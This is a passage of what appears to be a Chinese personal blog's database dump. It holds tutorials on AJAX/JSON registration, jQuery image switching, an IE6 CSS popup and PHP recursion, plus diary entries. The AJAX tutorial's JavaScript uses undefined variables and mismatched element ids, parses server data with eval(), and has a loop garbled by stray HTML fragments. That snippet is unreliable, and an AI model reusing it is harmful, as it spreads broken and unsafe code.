</p>\r\n<P>而今天一位同事（到了别的单位当php程序员了，以前是写Css与网页设计的），可能对这方面的东西了解不太多，他给我发了个压缩包让我帮帮他，我看了看，是一个买车方面的网站，大概是在举行一个什么活动吧，右边是一个注册框，左边是一个显示已经注册的那些人的信息，应该好办吧？如果这个页是php的话，但是我看了看发现这个页时html的，或者大家会问这代表什么？那代表这个页面是个死的，不能变通的，它本身不能随着数据库数据的添加而产生相应的变化。那么如果要实现这个功能该怎样做呢？</p>\r\n<P>当Paperen我了解到这个后，我脑中浮现的解决方案是ajax+jquery+json，显然对于html我们可以使用js操作页面某些元素的增加与减少，这就是唯一能使html页面变通的办法了，而这些数据来自哪里呢？很明显是来自数据库，那怎来自数据库呢？不是说html是死的吗？所以我们要使用Ajax这个技术，Ajax又是什么……算了，我Paperen这篇的文章并不是写给对ajax一无所知的人看的（请原谅Paperen我吧…如果这样解析下去，我恐怕写不完了…），那么对于数据的封装我们就可以用上json了！</p><P><br />下面Paperen先写个很简陋的html页面，好让对这个功能不太了解的人有个形象的认识。<br /></p><P><PRE>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;<br />&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;<br />&lt;head&gt;<br />&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312" /&gt;<br />&lt;title&gt;json+ajax&lt;/title&gt;<br />&lt;script language="javascript" type="text/javascript" src="js/jquery.js"&gt;&lt;/script&gt;<br />&lt;script language="javascript" type="text/javascript" src="js/car.js"&gt;&lt;/script&gt;<br />&lt;/head&gt;<br />&lt;body onload="read_data()"&gt;<br />&lt;ul id="member_list"&gt;<br />&lt;/ul&gt;<br />&lt;span id="reg_tip"&gt;&lt;/span&gt;<br />&lt;p&gt;Name:&lt;input type="text" id="name" /&gt;&lt;/p&gt;<br />&lt;p&gt;Phone:&lt;input type="text" id="phone" /&gt;&lt;/p&gt;<br />&lt;p&gt;Email:&lt;input type="text" id="email" /&gt;&lt;/p&gt;<br />&lt;p&gt;&lt;input type="button" id="reg_btn" value="Submit" onclick="reg()" /&gt;&lt;/p&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></PRE><P></p><P>这里稍微注意一下，在中引入js文件时要注意引入的顺序，先是要引入jquery.min.js，jquery的框架（这是必须的），还有引入一个是我们自定义的js文件，用来放我们自定义的一些js函数。如果引入顺序颠倒了，会导致我们写的js函数中的某些功能不能正常工作的。<br />给body引入一个onload事件，就是浏览器第一次加载这个页面时会触发read_data()这个函数，member_list是用来显示数据的，记得id名字在一个页面中是唯一。我这里随便弄了三个text框，id分别是name，phone，email，还有一个按钮叫reg_btn给它一个onclick事件，就是点击后触发后面的一个叫reg()函数。<br />同时我们要把需要的文件都建立好，还有路径确定好，Paperen我是这样分配的，根目录中放着两个文件，一个是这个index.html页面，一个是叫paperen.php的文件，名字根据个人需求起吧，还有三个文件夹分别是js（用来放js文件）,data（之后用来放数据文件的），class(放一个来用处理mysql连接的类)，因为这是一个例子所以文件就这么多就可以了，可能实际操作中会需要更多文件来实现整站的功能，下面我们来写写js动作吧，实现第一个功能就是用户注册功能。<PRE> function reg(){<br /> //在这里进行一下判断，非空之类的<br /> var name=$("#name").val();<br /> var phone=$("#phone").val();<br /> var car=$("#car").val();<br /> $.post("paperen.php",{Action:"post",act:''reg'',name:name,phone:phone,email:email},function(data){<br />  //alert(data);                   if(data==1){<br />   //注册成功<br />   $("#reg_tip").html("注册成功");<br />   //重新刷新页面<br />   setTimeout("window.location.reload();",1500);<br />  }else{<br />   //注册失败<br />   $("#reg_tip").html("注册失败，请重试");<br />  }<br /> });<br /> }</PRE><P>这就是实现注册功能的一个js函数，我使用了JQuery来调用ajax，而不是使用传统js的方法来调用ajax，大家可以对比一下jquery来调用ajax与传统那种方法，看看哪个更简洁一些。将html页中的数据以post的方式传送到一个叫paoeren的php文件处理，而对于paperen文件中怎样进行编码我这里就不多说了，就是要组合一条sql语句然后送入数据库执行，ok则返回1，不ok则返回0到我们浏览器端的js函数进行判断注册成功与否，然后根据这个data值分别执行不同的操作，这就是ajax技术的强大之处。（如果要调试的话，可以使用alert对data进行一下调试，看看从php文件送回来的数据是不是正确）不过还应当注意一下在paperen页中编码问题，例如要用header定义一下页面的编码是很要必要的，另外要使用iconv函数对传送过来的数据进行编码转换，不然很可能会使中文数据产生乱码的现象。对于ajax传值时的编码问题可以看看Paperen以前写的那篇 Ajax实现网页聊天 ，这里就不多说了。（这里我只想说说html页与js的编写方面还有json的运用，php那边就轻轻地说而已。）</p><P><br />这就是实现了注册的功能，但还有一个功能就是显示注册的信息，我们需要读出数据，原理与注册功能是一样的，同样是使用ajax，但是还需要json对数据进行封装有利于它的传送，而我这里还进行了一个处理，就是将数据放到data文件夹一个文件中（比如是data.txt吧），为什么还要将数据放到一个文件中呢？可能有人会问这个问题，嗯，paperen我在做到那一步的时候也这么考虑过，用直接将数据从php那个页面传过来不就行了，还要弄个文件放数据？是不是有点多余啊？而我是这样想的，因为如果你不建立这个data文件的话会增加数据库的负担，因为我们每次访问这个html页就会触发去查一下数据库的数据然后再将数据传送过来。可以举个例子来对比一下。</p><P><br />如果有10个人访问这个页面，其中4个人进行注册，那么如果不建立这个data文件的话，需要与数据交互18次（10次来自第一次加载页面，4次是因为要往数据库写入注册信息，还有4次是当注册成功后页面重新加载时产生的），如果建立这个data文件的话，只需要与数据库交互4次。可见优势在哪里了，但当然这样做也有自身的不足。<br />对于对数据进行json编码也很简单，不过对于php版本大于5.2.0才会支持这个函数，paperen我这个空间上的php就没有json_encode这个函数不过还是有弥补的方法的，下面是一个json_encode函数。 </p><P><A href="http://rikugun.javaeye.com/blog/242577">http://rikugun.javaeye.com/blog/242577</A> </p>\r\n<P>好像还有关于json的专门一个class文件，paperen我暂时没找到资源，所以目前我也只是将json函数引入到站点的函数库文件中去解决这个问题的。使用这个函数时直接json_encode($array)就ok啦。</p><P>再说一下read_data()这个函数吧，当页面加载的时候就会执行该js函数与paperen.php进行交互，并从data/data.txt中读取数据显示到页面上。</p><PRE>function read_data(){<br />  $.post("paperen.php",{Action:"post",act:"read"},function(data){<br />   //alert(data);//这里进行调试之用,弹出从read文件传来的数据<br />   if(data){<br />    var result=eval(''(''+data+'')'');<br />    var info="";<br />    for(i=0;i<result.length;i++)<br />    {<br />     info+="</result.length;i++)<br />&lt;li&gt;name:"+result[i].name+" phone:"+result[i].phone+" car:"+result[i].email+"&lt;/li&gt;";<result.length;i++)<br /><br /><result.length;i++)<br />    }<br />    $("#show_info").html(info);<br />   }<br />   else{<br />    $("#show_info").html("读取失败");<br />   }<br />  });<br /> }<br />其实这个read_data与reg其实都差不多，而它的重点在于要对json封装的数据进行解封的操作并组合成我们要求的html结构再输出到页面上，而这一句就是获取json的数据的关键</result.length;i++)<br /></PRE><PRE>info+="&lt;li&gt;name:"+result[i].name+" phone:"+result[i].phone+" car:"+result[i].email+"&lt;/li&gt;";<br /></PRE><P> 而对于paperen.php文件中获取数据这个操作，其实就是一个读取文件并获取数据的操作，fopen,fread这两个函数就可以派上场了，如果大家考过三级计算机等级考试或者学过c语言的话对这两个函数都应该有点印象，上机题目中都是用这几个函数去处理文件中的数据的。</p><P><br />而最后paperen又想了想是不是可以将json封装的数据直接写到一个js文件里面放到一个变量中然后在页面加载的时候引入这个js文件不就可以了还省去了与paperen文件交互的一环，确实这个方法比我这样做更好，而我同事给我的那个站点文件中就是用了这个方法来处理的，其实已经有一个不错的思路，但也得能了解才能去写代码，如果连json都不太清楚的话，碰到这种数据形式真的不知道怎下手的。而paperen我还是觉得实现一个功能确实有很多种途径，但若要寻求一种最优的方法的话，确实需要下不少功夫，至少你要了解很多东西，想到这里paperen我又想起了我们副院长说的那句话“任何技术上的问题都不会是问题，只要给你足够的时间与支持。”，paperen我越来越觉得这是个真理了。</p><P>最后最后还发表一下感慨吧――发表一篇文章真不容易啊！这篇文章都写了三天了……本来昨晚就可以发表出来的了，却加班到晚上八点……回到宿舍都8点半了……</p></p>', 2, 1, 1081, 0, 0, 0, 1260926668, 0),
(50, '无题', 'untitled', 1, '<p>毕业了上工作了就真的不一样，对于paperen来说好像每天都是为了工作，而生活对于paperen来说也就是花在公交车上与吃饭睡觉的时间而已，一切一切都很单调，在深圳我目前没有任何朋友。这些天在深圳的日子给paperen的感觉也真的够复杂的了，貌似离开了青岛就仿佛一下子从自己的生活中失去了半个世界，之前4年来都离不开我眼中的舍友们与学校的朋友们，paperen的大学就是这样一下子过去了。</p><p>当初6月30日离开了学校，然后7月1日离开了青岛，记得30日那天下午paperen是宿舍第一个离开的，本来觉得应该不会太激动的，但是在临离开宿舍的一刻感情爆发了……真的很不舍得大家，与paperen一起回广东的智同学还竟然为自己落泪感到惊奇~~或许确实应该惊奇~~</p><p>唉，放个排比句感叹一下~那些可以约几个朋友去踢球的日子啊~那些可以与舍友一起玩游戏的日子啊~那些可以听着高频课看课外书的日子啊~生活现在都是由自己说了算，早上7点起床然后去搭公交，8点多到公司然后就一直待到晚上的8点才回“蜗”，9点多回到“蜗”冲凉然后看会书就ZZZ了，嗯，偶尔也用手机放几首歌来唱唱那也就是唯一的娱乐方法了。</p><!--more--><p>感觉深圳还是蛮像香港的，公交在上下班时间一样挤，高楼大厦也那么高，消费也是相当高的，一天两餐也至少要30，住的地方就更加小但是价格还高。而paperen觉得有趣的是这里的饭馆盛饭的东西为什么那么像烟灰缸……就那么小的一盆饭……paperen相当无语，难道深圳的人饭量就真的那么小。</p><p>好好干吧，将公司的项目做好或许就是paperen最好的实力证明，一切都在坚持，一切都在酝酿，嗯，其实生活，应该说是人生貌似就是一杯酒~~所以大家也好好努力吧，有些苦是值得你熬的。</p></p>', 2, 1, 1319, 2, 1, 0, 1279586377, 0),
(13, '停顿一刻', 'break-a-moment', 1, '<P>可能是因为昨晚加班了3个小时的原因，今天一到五点半同事们都喊着下班了，我也把自己该完成的完成了。 </p>\r\n<P>今天是最早下班的一次，明天再去一天就不用去了，其实paperen我目前身份还不是正式员工，就是个实习的，估计工资也没多少，还不到两个月就退了，回来考完试就等着回家吧，都快一年没回去了，有点想念家的味道了。 </p>\r\n<P>而对于毕业也就是不到半年的时间了，paperen现在脑子还是空空的，虽然有想过自己开一家网络公司，为大家做很多很多好的网站，但是这个想法还不太成熟，毕竟自己的水平还没达到那个点，paperen我有时候会想“啊，不知道从清华那些很牛的学校出来的计算机毕业生的水平会比自己高多少呢？是不是他们每个人都会做网站写软件呢？”，paperen我也会安慰自己说“我只是学通信的，web方面的知识都是自学的而已，已经很不错了。” </p><!--more-->\r\n<P>确实paperen我并不是个天才，从初中开始就注定是这样，呵呵，我只能靠努力去弥补智力上的不足。我确信如果每个人都能做得比我好，只要你比我努力的话。 </p>\r\n<P>又不知道自己说到哪了？过完明天自己就可以休息一段时间了，这个学期真的很充实而且很辛苦，paperen我很是感慨的说，泪珠都差点掉下来了，-。-！ </p>\r\n<P>paperen我刚才在腾讯招聘那投了自己的简历，在有什么奖励与参加了什么竞赛那全空白…也不抱多少希望，就是try一下吧。 </p>\r\n<P>感觉工作就是很单调的，一天都对着电脑敲着键盘，看着几个浏览器与一堆代码，这种技术类的工作就是与电脑交流的，但偶尔在实现某种功能或在写某个代码的时候突然来劲，偶尔迸发出那么一丝自己对程序的兴趣时就值得paperen我继续做下去。不知道大家有没有这种体会。 </p>\r\n<P>停顿一刻就为了听听自己的心声，看清前方的路线，了解自己现在的脚步，还有缓解自己身心的疲倦。</p></p>', 2, 1, 884, 0, 0, 0, 1260964651, 0),
(14, '第三代懒吧制造中', 'g3-urlazy', 1, '<P>Paperen我在星期六将公司的任务处理完就退了，确实有点不舍得，两个小刘，两个小王，小李，小潘当然还有经理，都很好人，paperen我会想念大家的。既然自己下定走的打算了，就确实不能留在这里发展了，还是回家吧，即使不知道明天会怎样，但是paperen我还是有信心的。 </p>\r\n<P>今天是星期一，又是一个星期的开始，一早上就开了一个有关我们专业实习的会，看来这个星期也闲不到哪去…昨天用了一天将懒吧首页重新设计一下，paperen我打算将懒吧重做，包括程序，数据库，还有页面，趁自己还有时间，完善懒吧也是我26岁之前的目标之一啊。 </p>\r\n<P>这里先show一下新设计的logo不知道大家喜欢这个logo不？可能吴思他就不喜欢这个… </p><!--more-->\r\n<P><a href="http://localhost/paperenblog/file/6" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/6" alt="200912211261360474" title="上传于2009-12-21"></a> </p>\r\n<P>至于什么时候才能将新版的懒吧拿出来见面以后再定吧，因为工程毕竟也不少，而且还得回到asp去，肯定会有点不适应。 </p>\r\n<P>大家期待吧――新版懒吧的面世！</p></p>', 2, 1, 1238, 0, 0, 0, 1261360799, 0),
(15, '实习项目--编解码', 'code-uncode-practice', 2, '<P>paperen对于这个没有什么可说的…就是为了应付实习，又浪费了自己数据库中一个ID号… </p>\r\n<P>而对于这个程序既然老师说可以用任何语言来做我就用php来做一个吧，vc++我都忘得差不多了…老师检查的话直接给他网址就是了，用php来做这个实习项目唯一缺点就是依赖于浏览器与服务器了，在我目前的理解如果php离开了服务器似乎是不能运行，但paperen我还是觉得肯定有其他办法可以让php在别的环境编译的，只是paperen我见识少而已。 </p>\r\n<P>程序地址 <A href="http://iamlze.cn/demo/code/">http://iamlze.cn/demo/code/</A></p><!--more--></p>', 2, 1, 1000, 1, 0, 0, 1261390527, 0),
(16, 'JQuery制造简单的图片切换', 'simple-jquery-picshow', 3, '<P>Paperen对于js了解的确实不多，以前一向就是写一些简单的功能，例如检验输入非空还有地址返回的功能还有用js控制一下样式之类的，之后直接接触JQuery，用JQuery集成的效果只需要一两行的代码，但是如果不用JQuery的框架去写js代码的话可能没有一百多行都写不出来，感觉用JQuery是方便多了，但是Paperen有空的时候也还是要去认真学习一下JavaScript的，还有prototype这个框架。 </p>\r\n<P>前言就说一下自己对于js的体会吧，前些时间趁自己有空用jquery做了一个切换图片的小玩意，简单到不能再简单的东西。 </p>\r\n<P><A href="http://iamlze.cn/demo/js-change-pic/">http://iamlze.cn/demo/js-change-pic/</A></p><!--more-->\r\n<P>首先打好html结构 </p><P><PRE>&lt;div class="banner"&gt;<br />  &lt;img src="images/big_banner1.jpg" /&gt;<br /> &lt;/div&gt;<br /> &lt;div class="banner_nav"&gt;<br />  &lt;a id="3" href="#"&gt;&lt;/a&gt;<br />  &lt;a id="2" href="#"&gt;&lt;/a&gt;<br />  &lt;a id="1" href="#"&gt;&lt;/a&gt;<br /> &lt;/div&gt;</PRE><P></p><P>然后写Css，完成对html的布局与美化</p><P><PRE>&lt;style&gt;<br />*{margin:0px;padding:0px;}<br />.banner{width:900px;height:300px;margin:30px auto 0px auto;}<br />.banner_nav{height:20px;width:900px;margin:5px auto;}<br />.banner_nav a{float:right;background:url(images/btn.jpg) left no-repeat;display:block;width:12px;height:12px;margin:0px 2px 0px 2px;}<br />.banner_nav a:hover,.banner_nav a.now{color:#FFFFFF;background-position:-12px;}<br />&lt;/style&gt;<br /></PRE><P>再调入jquery的框架</p><P><PRE>&lt;script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3/jquery.min.js"&gt;&lt;/script&gt;</PRE><P></p><P>我这里为了方便演示例子所以引入了网上的jquery文件，当然你可以将jquery的框架下载到本地或者放到空间中去引用下载jquery </p>\r\n<P>最后我们开始写js代码： </p><PRE><P>$(function(){<br />  $(".banner_nav a").click(function(){//当.banner_nav中的a元素被点击会触发这个动作<br />   $(".banner_nav a").removeClass(''now'');//去掉所有a的now属性<br />   var id=this.id;//获得a的id号<br />   $(this).addClass(''now'');//为该a加上now属性<br />   $(".banner img").fadeOut(''fast'',function(){//.banner中的img执行淡出的效果<br />    $(".banner img").attr("src","images/big_banner"+id+".jpg");//.banner的img修改scr属性为images/big_banner"+id+".jpg<br />   });<br />   $(".banner img").fadeIn(''slow'');//再淡入<br />  });<br /> }); </p></PRE><P>对于JQuery，Paperen我发现了外国的一个很牛的网站 <A href="http://www.sohtanaka.com">http://www.sohtanaka.com</A> 有兴趣的可以去看看，他写的blog文章那些效果都超cool的。</p></p>', 2, 1, 1513, 1, 1, 0, 1261576068, 0),
(20, '完美的弹出层', 'perfect-popubox', 3, '<P>先来看最终效果图吧</p>\r\n<P><a href="http://localhost/paperenblog/file/7" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/7" alt="201001021262426657" title="上传于2010-01-02"></a> </p>\r\n<P>例子<A href="http://iamlze.cn/demo/pop-box/"> http://iamlze.cn/demo/pop-box/</A></p><!--more-->\r\n<P>其实这个效果目前都应用得很广泛了，也是一个Cool的交互效果，类似于vista执行一些需要权限较高的文件时弹出那个询问框。至于技术要点主要落在CSS上，基本的HTML结构很简单就是两个div</p>\r\n<P><PRE>&lt;div class="shadow" id="p_shadow"&gt;&lt;/div&gt;<br />&lt;div class="popbox" id="p_popbox"&gt;box&lt;/div&gt;<br /><P></p></PRE><P>理论上，我们只要设定class为shadow的那个div的position为fixed，top为0，left为0，高度为100%，宽度为100%，z-index为一个较大的值（保证它能在所有元素的上方），设背景色再加上滤镜效果。 </p>\r\n<P>而对于class为popbox而言，设置z-index比shadow大，position为fixed，top为50%，left为50%，固定宽与高，然后margin-left为负的（自己宽度的一半），margin-top为负的（自己高度的一半）。 </p><PRE><P>.shadow{display:none;background:#000000;width:100%;height:100%;left:0;top:0;filter:alpha(opacity=40);opacity:0.4;z-index:999;position:fixed;}<br />.popbox{display:none;z-index:1001;width:400px;height:100px;background:#F7F7F7;border:1px #999999 solid;position:fixed;top:50%;left:50%;margin:-50px 0px 0px -200px;}</p></PRE><P> paperen我这里说的是理论上而已…实际上就没那么简单了，因为我们得要考虑到某些浏览器，例如可恶的ie5，ie6。我们不妨将上面理论上的写成CSS代码，看看效果（特别是ie6中的效果） </p>\r\n<P><a href="http://localhost/paperenblog/file/8" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/8" alt="201001021262427886" title="上传于2010-01-02"></a> </p>\r\n<P>额……挺令人失望的，但是ie7与火狐（FF）还有opera中的效果都是很好的，所以paperen我才说可恶的ie6，确实如果全世界都将ie5，ie6淘汰掉的话，确实可以救活很多人的脑细胞，但是很明显我们这种希望是不可能的，按目前来看ie6似乎是不会这么快就被淘汰掉的，很多人使用的还是ie6，paperen的宿友电脑上就还有使用ie6的，这个可恶又不可逃避的ie6…… </p>\r\n<P>抱怨归抱怨，毕竟这些浏览器对CSS的解析BUG都是历史问题了再抱怨也没用，还是得寻求办法解决，我们要使我们的代码兼容所有浏览器，那么来看看应该怎做吧。 </p>\r\n<P>因为ie6不支持fixed这个属性，我们只能使用absolute这个进行定位，但是还要加入一些expression，这个也是个很特殊的属性，其实就是个JavaScript。 </p><PRE><P>_position:absolute;_top:expression(eval(document.compatMode &amp;&amp; document.compatMode==''CSS1Compat'') ? documentElement.scrollTop + (document.documentElement.clientHeight-this.offsetHeight)/2 : document.body.scrollTop + (document.body.clientHeight - this.clientHeight)/2);</p></PRE><P>document.body.scrollTop+(document.body.clientHeight-this.clientHeight)/2这句是什么意思？其实paperen自己也没搞太清楚，不过自己也是研究了半天，觉得意思就是滑动条到滑动条顶部的距离+（屏幕的高度-这个div的高度）/2，自己可以想想这个js的意思，就是要保持div一直处于屏幕的中部。（当然你还可以自己去谷歌一下） </p>\r\n<P>paperen我很兴奋地以为这次ie6应该没问题了吧，但是为什么阴影不是百分百高度呢……<a href="http://localhost/paperenblog/file/9" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/9" alt="201001021262429281" title="上传于2010-01-02"></a> </p>\r\n<P>唉，还是给了我一个打击，在网上查了些资料，又回来看看代码，觉得是不是body高度的问题啊，对于这个div设置成百分百高度的话，是不是body也应该设置成百分百高度才行？加上body{hegiht:100%;}果然有用，paperen我也找了些资料来说明这个问题。 </p>\r\n<P>一个对象高度是否可以使用百分比显示，取决于对象的父级对象，.shadow在页面中直接在body之中，因此它的父级是body，而浏览器默认状态下，是没有给body一个高度属性的，因此当我们直接设置.shadow为height:100%;时，不会产生任何效果，而当我们给body设置了100%之后，它的子级对象.shadow的height:100%;便发生作用了，这便是浏览器解析规则引发的高度自适应问题。而代码中除了给body应用之外，还给HTML对象也应用相同的样式设计，这样做的好处是使IE与firefox浏览器都能够实现高度自适应，而body却不是。另外，Firefox中的HTML标签不是100%高度，因此给两个标签都定义为height:100%;以保证两个浏览器下均能够正常显示。 </p>\r\n<P>也就是说我们要加上html,body{hegiht:100%;}这句。好了，终于这个效果兼容ie6了，真是不容易啊~~ </p>\r\n<P>最后自己再渲染一下那个pop box的样式，加上一些脚本触发弹出与关闭的事件，用jquery加上一些效果fadeIn,fadeOut，就很不错了。</p></p>', 2, 1, 1267, 1, 0, 0, 1262429911, 0),
(21, '递归的使用', 'recursive', 2, '<p>最近paperen我都是在看别人的代码，phpcms，wordpress，都看得头晕眼花的，再次证实了自己那个真理--“看别人写的代码真是痛苦”，但是为了升级自己的php技能与水平，增加点经验值这也是必经之路啊。&nbsp;</p>\r\n<p>不多说，前几天看到phpcms一个addslashes功能的函数，挺不错的，有了递归的方法，如果参数是一个数组的话会遍历整个数组数值，对于addslashes函数的定义就是给单引号('')，双引号(")，反斜杠(/)加上反斜杠。&nbsp;</p><pre>echo addslashes("  '' " ");//将会得到 '' " &nbsp;</pre><p>虽然递归用得不是很多，但是有时候也会派上用场，例如phpcms中那个函数。&nbsp;</p><!--more--><pre>function new_addslashes($string)<br />{<br />&nbsp;if(!is_array($string)) return addslashes($string);<br />&nbsp;foreach($string as $key =&gt; $val) $string[$key] = new_addslashes($val);<br />&nbsp;return $string;<br />}</pre><p>很不错的递归，遍历了整个数组并给每个值套用了addslashes。其实好像考计算机等级考试的时候都偶尔会遇到递归。例如求一个数的阶。&nbsp;</p><pre>function deep_in($num){<br />&nbsp;&nbsp;if(is_numeric($num) &amp;&amp; $num&gt;0){<br />&nbsp;&nbsp;&nbsp;return $num*deep_in($num-1);<br />&nbsp;&nbsp;}else if(!is_numeric($num)){<br />&nbsp;&nbsp;&nbsp;exit(ERROR);<br />&nbsp;&nbsp;}else{<br />&nbsp;&nbsp;&nbsp;return 1;<br />&nbsp;&nbsp;}<br />&nbsp;}</pre><p>但是要注意的是，对于递归得要设置跳出点，不然会程序会不停地递归，就好像上面要判断一下$num是否大于0，如果不是就返回1吧，不然程序会一直递归下去deep_in($num-1)，你觉得会算到什么时候呢……（当然现在看看这个程序貌似如果输入参数为负数时返回的也是1，不太对劲…）&nbsp;</p>\r\n<p>而还有其他例子，大家可以随意发挥，写一下就会有思路了。我还写了个过滤函数。&nbsp;</p><pre>function deep_strreplace($string){<br />&nbsp;&nbsp;$filter=array(''NND'',''妈妈的'');<br />&nbsp;&nbsp;if(!is_array($string)) return str_replace($filter,''***'',$string);<br />&nbsp;&nbsp;foreach($string as $key=&gt;$val) $string[$key]=deep_strreplace($val);<br />&nbsp;&nbsp;return $string;<br />&nbsp;}<br />&nbsp;$text_array=array(1=&gt;''你NND的'',2=&gt;''NND的'',3=&gt;''妈妈的'');<br />&nbsp;print_r(deep_strreplace($text_array));<br />//Array ( [1] =&gt; 你***的 [2] =&gt; ***的 [3] =&gt; *** )</pre><p>毕竟说脏话是不对滴嘛。</p><p>2010/12/24 剩蛋節前一天補上：原來php裏面有一個強大的函數！才瞭解到所以補上，函數叫array_map，<span class="dc-title">将回调函数作用到给定数组的单元上，所以這裏可以寫成這樣</span></p><pre>function deep_strreplace($string){<br />	$filter=array(''NND'',''妈妈的'');<br />	return !is_array($string) ? str_replace($filter,''***'',$string) : array_map(''deep_strreplace'', $string);<br />}<br /></pre><p>果然夠簡練！好漂亮啊！Nick one！</p></p>', 2, 1, 923, 0, 0, 0, 1262610483, 0),
(22, 'WEB正在标准化中？', 'web-standarding', 4, '<P>才看了一个网页，关于WEB标准化的思考，<a href="http://kb.operachina.com/node/20" target="_blank">http://kb.operachina.com/node/20</a>，“梦想虽然很美，但实际上到底怎么样”，这个话题也很值得web开发者的深思，貌似这个话题早就存在，但是一直一直进展都很缓慢，到底有多少个网站能符合web标准。看看上面那个链接的调查就知道。?</p>\r\n<P>对于测试网站的标准化检测，你可以登录到这里并输入网址对html文档还有css文档进行检验。?</p>\r\n<P>xhtml：<a href="http://validator.w3.org/" target="_blank">http://validator.w3.org/</a></p><!--more-->\r\n<P>css：<a href="http://jigsaw.w3.org/css-validator/" target="_blank">http://jigsaw.w3.org/css-validator/</a></p>\r\n<P>其实paperen我并不是一个很专业的web设计师，目前我只能体会到css的强大之处并明白了简化hmtl结构的重要处，the less is more，以最少的html结构完成我们想要的布局与效果，paperen我曾经看到过好像是腾讯还是百度招聘一个职位叫高级html开发者，是这样叫吧…忘了，再看看职位描述有一句“尽量用最简洁的html结构完成页面，并且能有很好的重用性”，描述大体上是这样说吧，html对于每个web开发者来说真是很基础的了，哪个web开发者不会html，但是要做到高级这两个字就真的有点困难了。举个例子吧。</p>\r\n<P>如果让你写一个如图这个html布局，你会怎写</p>\r\n<P><a href="http://localhost/paperenblog/file/10" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/10" alt="201001051262696825" title="上传于2010-01-05"></a></p>\r\n<P>这样？</p><P><PRE>&lt;table&gt;<br /> &lt;tr&gt;&lt;td&gt;&lt;a href="#"&gt;logo&lt;/a&gt;&lt;/td&gt;&lt;td&gt;搜索栏&lt;/td&gt;&lt;/tr&gt;<br /> &lt;tr&gt;&lt;td colspan="2"&gt;导航栏&lt;/td&gt;&lt;/tr&gt;<br />&lt;/table&gt; <br /></PRE><P>这样？</p><P><PRE>&lt;div&gt;<br />  &lt;div&gt;&lt;a href="#"&gt;logo&lt;/a&gt;&lt;/div&gt;<br />  &lt;div&gt;搜索栏&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;div&gt;导航栏&lt;/div&gt;<br /></pre></p><P>这样？</p><P><PRE>&lt;div&gt;&lt;a href="#"&gt;logo&lt;/a&gt;&lt;div&gt;搜索栏&lt;/div&gt;&lt;/div&gt;<br />&lt;div&gt;导航栏&lt;/div&gt;<br /></PRE></p><P>这样？</p><P><PRE>&lt;a href="#"&gt;logo&lt;/a&gt;&lt;div&gt;搜索栏&lt;/div&gt;<br />&lt;div&gt;导航栏&lt;/div&gt;<br /></PRE></p><P>这样？</p><P><PRE>&lt;a href="#"&gt;logo&lt;/a&gt;&lt;div&gt;搜索栏&lt;/div&gt;<br />&lt;ul&gt;导航栏&lt;/ul&gt;<br /></PRE></p><P>上面的html应该都可以实现，虽然paperen我没试过…但是对于前两种我本人是不推荐的了，用table布局…，paperen我最不希望看到整个页面都是用table布局的了，第二个div太多了，多余的应该去掉，后面三个都可以考虑，不过后面两个有挑战性，paperen我想了想这两个css的编写也不一定能写出来，最简洁的html结构不是一件容易的事情。</p><P>至于重用性，你可以想象嘛，如果你的html写得好的话，当更换页面皮肤主题时，根本不需要更改html结构，你只需要去修改css文档，知道这个网站吧，http://www.csszengarden.com/ 用一个html结构就可以变化出很多很多漂亮的页面。<br /></p><P>对于xhtml的验证是有难度的，网页中一些元素需要用/&gt;结束，href中的地址不能用类似?id=123&amp;type=1之类的参数，这都只是对于文档的类型Transitional而言，如果是strict的话可能会更加严格，paperen自己的网站就只能通过Transitional的验证而已，strict还没有合格，而对于css文档编写也更是讲究了，class与id的命名确实也是一门学问。</p><P>web标准确实是件很好的事情，但是在商业味道特浓的当今网络，有多少人会注意这个，只希望这个信息能存在在web开发者的脑中吧。</p></PRE></p>', 2, 1, 1018, 0, 0, 0, 1262698790, 0),
(23, '好酷的Widget', 'cool-widget', 4, '<P>paperen昨天研究了一天的widget并且将答辩论文都准备好了，当然论文写的就是widget这个小东西，不知道大家有没有听过widget，翻译过来的意思就是微件，还是贴上比较权威的解析吧，“widget是一小块可以在任意一个基于HTML的Web页面上执行的代码，它的表现形式可能是视频，地图，新闻，小游戏等等。它的根本思想来源于代码复用，通常情况下，Widget的代码形式包含了DHTML,JavaScript以及Adobe Flash。” </p>\r\n<P>可能这样说也没什么意思，还是贴一下图让大家see see。 </p>\r\n<P><a href="http://localhost/paperenblog/file/11" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/11" alt="201001081262957266" title="上传于2010-01-08"></a></p><!--more--><P>google翻译 </p>\r\n<P><a href="http://localhost/paperenblog/file/12" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/12" alt="201001081262957307" title="上传于2010-01-08"></a></p>\r\n<P>天气报告 </p>\r\n<P><a href="http://localhost/paperenblog/file/13" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/13" alt="201001081262957336" title="上传于2010-01-08"></a></p>\r\n<P>画画板（自己是我画的哦，可爱吧） </p>\r\n<P><a href="http://localhost/paperenblog/file/14" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/14" alt="201001081262957378" title="上传于2010-01-08"></a></p>\r\n<P>当然还有小游戏玩 </p>\r\n<P><a href="http://localhost/paperenblog/file/15" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/15" alt="201001081262957520" title="上传于2010-01-08"></a></p>\r\n<P>当然少不了自己diy一个。 </p>\r\n<P>估计大家应该有装过鱼鱼桌面秀之类的桌面工具吧，widget在pc上的应用表现形式就与那个差不多，你可以对它进行拖移，你不需要打开浏览器就可以查看天气预报与邮件信息，还有最新资讯。而且他们的外表可以做得很cool，满足我们视觉上的要求。 </p>\r\n<P>好像现在windows上还需要安装一些模块才能支持widget，不知道win7能不能支持widget，反正xp下是不支持的，因为widget这个小玩意是出自苹果操作系统的,目前windows平台对它的支持还不是很好，但是paperen我觉得会渐渐普及起来的，我看好widget这个小玩意，确实很cool。 